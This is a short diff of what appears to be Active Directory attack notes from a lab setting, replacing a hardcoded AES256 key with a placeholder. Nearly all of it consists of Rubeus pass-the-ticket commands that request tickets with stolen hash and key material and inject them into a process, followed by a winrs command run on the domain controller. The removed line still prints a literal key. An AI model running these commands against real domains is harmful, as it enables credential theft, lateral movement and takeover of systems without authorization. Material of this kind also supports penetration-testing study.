@@ -74,7 +74,7 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 
 #if you have elevated session use below
 #1- Create a new process & inject the ticket init
-C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
 #2- Access the DC from the new process
 winrs -r:dcorp-dc cmd /c set username
